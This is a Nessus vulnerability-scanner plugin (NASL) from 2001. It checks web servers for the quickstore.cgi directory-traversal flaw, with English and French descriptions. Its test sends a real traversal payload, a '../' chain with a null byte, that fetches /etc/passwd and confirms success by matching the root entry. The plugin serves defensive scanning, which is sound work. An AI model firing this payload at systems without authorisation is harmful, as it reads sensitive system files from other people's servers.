#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10712);
 script_version ("$Revision: 1.2 $");
 script_cve_id("CAN-1999-0607", "CAN-2000-1188");
 
 name["english"] = "quickstore traversal";
 name["francais"] = "quickstore traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The CGI 'quickstore.cgi' is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : remove it from /cgi-bin or upgrade to the latest version.

Risk factor : Serious";


 desc["francais"] = "Le cgi 'quickstore.cgi' est install�. Celui-ci poss�de
un probl�me de s�curit� bien connu qui permet � n'importe qui de 
faire lire des fichiers  arbitraires au daemon http, avec les privil�ges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin ou mettez-le � jour 

Facteur de risque : S�rieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/quickstore.cgi";
 summary["francais"] = "V�rifie la pr�sence de /cgi-bin/quickstore.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
req = string(dir,
 "/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=");
req = http_get(item:req, port:port);
r = http_keepalive_send_recv(port:port, data:req);
if( r == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))security_hole(port);
}
